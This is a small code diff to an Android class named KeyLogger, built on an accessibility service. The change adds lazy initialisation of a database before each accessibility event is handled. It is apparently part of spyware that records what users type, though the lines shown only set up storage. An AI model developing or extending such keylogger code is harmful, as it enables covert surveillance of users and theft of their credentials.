@@ -29,6 +29,9 @@ public class KeyLogger extends AccessibilityService {
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         //Log.e(TAG, "EVENT TRIGGERED");
+        //init DbMgr if it's null
+        if (DbMgr.getDB() == null)
+            DbMgr.init(getApplicationContext());
 
         long nowTime = System.currentTimeMillis();
         //DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US);
